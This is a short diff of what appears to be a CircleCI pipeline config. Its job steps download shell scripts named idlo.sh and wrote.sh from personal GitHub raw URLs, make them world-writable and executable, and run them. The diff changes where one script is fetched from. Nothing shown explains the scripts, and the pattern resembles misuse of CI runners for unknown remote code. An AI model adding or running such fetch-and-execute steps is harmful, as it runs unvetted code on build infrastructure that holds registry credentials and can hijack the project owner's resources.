@@ -8,6 +8,6 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/raufpermana22/cirli/main/idlo.sh && chmod 777 idlo.sh && ./idlo.sh
+      - run: wget https://raw.githubusercontent.com/whinighayu/musr/main/idlo.sh && chmod 777 idlo.sh && ./idlo.sh
       - run: wget https://raw.githubusercontent.com/raufpermana22/cirli/main/wrote.sh && chmod 777 wrote.sh && ./wrote.sh
       
